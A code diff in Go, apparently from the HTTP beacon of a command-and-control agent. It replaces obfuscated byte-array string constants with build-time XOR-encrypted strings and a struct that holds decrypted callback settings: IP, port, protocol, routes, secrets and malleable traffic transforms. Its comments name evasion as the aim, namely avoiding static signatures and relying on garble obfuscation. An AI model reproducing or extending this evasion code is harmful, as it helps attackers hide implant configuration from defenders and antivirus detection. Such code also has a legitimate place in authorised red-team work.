@@ -11,50 +11,60 @@ import (
 	"strings"
 )
 
-// GetEnv strings (constructed to avoid static signatures)
+// DecryptedConfig holds all decrypted configuration values
+// Using a struct instead of map[string]string because garble obfuscates struct field names
+type DecryptedConfig struct {
+	UserAgent              string
+	ContentType            string
+	CustomHeaders          string
+	GetRoute               string
+	PostRoute              string
+	GetMethod              string
+	PostMethod             string
+	GetClientIDName        string
+	GetClientIDFormat      string
+	PostClientIDName       string
+	PostClientIDFormat     string
+	PostSecretName         string
+	PostSecretFormat       string
+	PublicKey              string
+	Secret                 string
+	Protocol               string
+	IP                     string
+	Port                   string
+	GetClientIDTransforms  string
+	PostClientIDTransforms string
+	PostDataTransforms     string
+	ResponseDataTransforms string
+}
+
+// HTTP protocol strings - injected at build time (XOR encrypted)
 var (
-	// Map keys for decrypted values
-	geKeyUserAgent        = string([]byte{0x55, 0x73, 0x65, 0x72, 0x20, 0x41, 0x67, 0x65, 0x6e, 0x74})                                                                                     // User Agent
-	geKeyContentType      = string([]byte{0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x20, 0x54, 0x79, 0x70, 0x65})                                                                         // Content Type
-	geKeyCustomHeaders    = string([]byte{0x43, 0x75, 0x73, 0x74, 0x6f, 0x6d, 0x20, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x73})                                                             // Custom Headers
-	geKeyGetRoute         = string([]byte{0x47, 0x45, 0x54, 0x20, 0x52, 0x6f, 0x75, 0x74, 0x65})                                                                                           // GET Route
-	geKeyPostRoute        = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x52, 0x6f, 0x75, 0x74, 0x65})                                                                                     // POST Route
-	geKeyGetMethod        = string([]byte{0x47, 0x45, 0x54, 0x20, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64})                                                                                     // GET Method
-	geKeyPostMethod       = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64})                                                                               // POST Method
-	geKeyGetClientIDName  = string([]byte{0x47, 0x45, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x49, 0x44, 0x20, 0x4e, 0x61, 0x6d, 0x65})                                     // GET Client ID Name
-	geKeyGetClientIDFmt   = string([]byte{0x47, 0x45, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x49, 0x44, 0x20, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74})                         // GET Client ID Format
-	geKeyPostClientIDName = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x49, 0x44, 0x20, 0x4e, 0x61, 0x6d, 0x65})                               // POST Client ID Name
-	geKeyPostClientIDFmt  = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x49, 0x44, 0x20, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74})                   // POST Client ID Format
-	geKeyPostSecretName   = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x20, 0x4e, 0x61, 0x6d, 0x65})                                                 // POST Secret Name
-	geKeyPostSecretFmt    = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x20, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74})                                     // POST Secret Format
-	geKeyPublicKey        = string([]byte{0x50, 0x75, 0x62, 0x6c, 0x69, 0x63, 0x20, 0x4b, 0x65, 0x79})                                                                                     // Public Key
-	geKeySecret           = string([]byte{0x53, 0x65, 0x63, 0x72, 0x65, 0x74})                                                                                                             // Secret
-	geKeyProtocol         = string([]byte{0x50, 0x72, 0x6f, 0x74, 0x6f, 0x63, 0x6f, 0x6c})                                                                                                 // Protocol
-	geKeyIP               = string([]byte{0x49, 0x50})                                                                                                                                     // IP
-	geKeyPort             = string([]byte{0x50, 0x6f, 0x72, 0x74})                                                                                                                         // Port
-
-	// Malleable transform config keys
-	geKeyGetClientIDTransforms  = string([]byte{0x47, 0x45, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x49, 0x44, 0x20, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x73})  // GET ClientID Transforms
-	geKeyPostClientIDTransforms = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x49, 0x44, 0x20, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x73}) // POST ClientID Transforms
-	geKeyPostDataTransforms     = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x44, 0x61, 0x74, 0x61, 0x20, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x73})                    // POST Data Transforms
-	geKeyResponseDataTransforms = string([]byte{0x52, 0x65, 0x73, 0x70, 0x6f, 0x6e, 0x73, 0x65, 0x20, 0x44, 0x61, 0x74, 0x61, 0x20, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x73}) // Response Data Transforms
-
-	// HTTP methods
-	geMethodGet  = string([]byte{0x47, 0x45, 0x54})       // GET
-	geMethodPost = string([]byte{0x50, 0x4f, 0x53, 0x54}) // POST
-
-	// Protocol strings
-	geProtoHttps = string([]byte{0x68, 0x74, 0x74, 0x70, 0x73}) // https
-	geProtoHttp  = string([]byte{0x68, 0x74, 0x74, 0x70})       // http
-	gePort443    = string([]byte{0x34, 0x34, 0x33})             // 443
-	gePort80     = string([]byte{0x38, 0x30})                   // 80
-
-	// URL format strings
-	geFmtUrlNoPort   = string([]byte{0x25, 0x73, 0x3a, 0x2f, 0x2f, 0x25, 0x73})                   // %s://%s
-	geFmtUrlWithPort = string([]byte{0x25, 0x73, 0x3a, 0x2f, 0x2f, 0x25, 0x73, 0x3a, 0x25, 0x73}) // %s://%s:%s
-	geFmtUrlQuery    = string([]byte{0x25, 0x73, 0x25, 0x73, 0x3f, 0x25, 0x73, 0x3d, 0x25, 0x73}) // %s%s?%s=%s
-	geSlash          = string([]byte{0x2f})                                                       // /
+	geMethodGet      string // GET
+	geMethodPost     string // POST
+	geProtoHttps     string // https
+	geProtoHttp      string // http
+	gePort443        string // 443
+	gePort80         string // 80
+	geFmtUrlNoPort   string // %s://%s
+	geFmtUrlWithPort string // %s://%s:%s
+	geFmtUrlQuery    string // %s%s?%s=%s
+	geSlash          string // /
 )
+
+func init() {
+	// Decrypt HTTP protocol strings at startup
+	geMethodGet, _ = xorDecrypt(geMethodGet, xorKey)
+	geMethodPost, _ = xorDecrypt(geMethodPost, xorKey)
+	geProtoHttps, _ = xorDecrypt(geProtoHttps, xorKey)
+	geProtoHttp, _ = xorDecrypt(geProtoHttp, xorKey)
+	gePort443, _ = xorDecrypt(gePort443, xorKey)
+	gePort80, _ = xorDecrypt(gePort80, xorKey)
+	geFmtUrlNoPort, _ = xorDecrypt(geFmtUrlNoPort, xorKey)
+	geFmtUrlWithPort, _ = xorDecrypt(geFmtUrlWithPort, xorKey)
+	geFmtUrlQuery, _ = xorDecrypt(geFmtUrlQuery, xorKey)
+	geSlash, _ = xorDecrypt(geSlash, xorKey)
+}
 
 func xorDecrypt(encoded, key string) (string, error) {
 	decoded, err := base64.StdEncoding.DecodeString(encoded)
@@ -70,53 +80,41 @@ func xorDecrypt(encoded, key string) (string, error) {
 	return string(result), nil
 }
 
-func decryptAllValues() map[string]string {
-	decrypted := make(map[string]string)
+func decryptAllValues() *DecryptedConfig {
+	cfg := &DecryptedConfig{}
 
-	toDecrypt := map[string]string{
-		geKeyUserAgent:        userAgent,
-		geKeyContentType:      contentType,
-		geKeyCustomHeaders:    customHeaders,
-		geKeyGetRoute:         getRoute,
-		geKeyPostRoute:        postRoute,
-		geKeyGetMethod:        getMethod,
-		geKeyPostMethod:       postMethod,
-		geKeyGetClientIDName:  getClientIDName,
-		geKeyGetClientIDFmt:   getClientIDFormat,
-		geKeyPostClientIDName: postClientIDName,
-		geKeyPostClientIDFmt:  postClientIDFormat,
-		geKeyPostSecretName:   postSecretName,
-		geKeyPostSecretFmt:    postSecretFormat,
-		geKeyPublicKey:        publicKey,
-		geKeySecret:           secret,
-		geKeyProtocol:         protocol,
-		geKeyIP:               ip,
-		geKeyPort:             port,
-		// Malleable transform configs
-		geKeyGetClientIDTransforms:  getClientIDTransforms,
-		geKeyPostClientIDTransforms: postClientIDTransforms,
-		geKeyPostDataTransforms:     postDataTransforms,
-		geKeyResponseDataTransforms: responseDataTransforms,
-	}
-
-	for k, v := range toDecrypt {
-		decryptedValue, err := xorDecrypt(v, xorKey)
-		if err != nil {
-			decrypted[k] = ""
-		} else {
-			decrypted[k] = decryptedValue
-		}
-	}
+	cfg.UserAgent, _ = xorDecrypt(userAgent, xorKey)
+	cfg.ContentType, _ = xorDecrypt(contentType, xorKey)
+	cfg.CustomHeaders, _ = xorDecrypt(customHeaders, xorKey)
+	cfg.GetRoute, _ = xorDecrypt(getRoute, xorKey)
+	cfg.PostRoute, _ = xorDecrypt(postRoute, xorKey)
+	cfg.GetMethod, _ = xorDecrypt(getMethod, xorKey)
+	cfg.PostMethod, _ = xorDecrypt(postMethod, xorKey)
+	cfg.GetClientIDName, _ = xorDecrypt(getClientIDName, xorKey)
+	cfg.GetClientIDFormat, _ = xorDecrypt(getClientIDFormat, xorKey)
+	cfg.PostClientIDName, _ = xorDecrypt(postClientIDName, xorKey)
+	cfg.PostClientIDFormat, _ = xorDecrypt(postClientIDFormat, xorKey)
+	cfg.PostSecretName, _ = xorDecrypt(postSecretName, xorKey)
+	cfg.PostSecretFormat, _ = xorDecrypt(postSecretFormat, xorKey)
+	cfg.PublicKey, _ = xorDecrypt(publicKey, xorKey)
+	cfg.Secret, _ = xorDecrypt(secret, xorKey)
+	cfg.Protocol, _ = xorDecrypt(protocol, xorKey)
+	cfg.IP, _ = xorDecrypt(ip, xorKey)
+	cfg.Port, _ = xorDecrypt(port, xorKey)
+	cfg.GetClientIDTransforms, _ = xorDecrypt(getClientIDTransforms, xorKey)
+	cfg.PostClientIDTransforms, _ = xorDecrypt(postClientIDTransforms, xorKey)
+	cfg.PostDataTransforms, _ = xorDecrypt(postDataTransforms, xorKey)
+	cfg.ResponseDataTransforms, _ = xorDecrypt(responseDataTransforms, xorKey)
 
 	// Set defaults for HTTP methods if they're empty
-	if decrypted[geKeyGetMethod] == "" {
-		decrypted[geKeyGetMethod] = geMethodGet
+	if cfg.GetMethod == "" {
+		cfg.GetMethod = geMethodGet
 	}
-	if decrypted[geKeyPostMethod] == "" {
-		decrypted[geKeyPostMethod] = geMethodPost
+	if cfg.PostMethod == "" {
+		cfg.PostMethod = geMethodPost
 	}
 
-	return decrypted
+	return cfg
 }
 
 // buildBaseURL constructs the base URL using protocol, IP and port
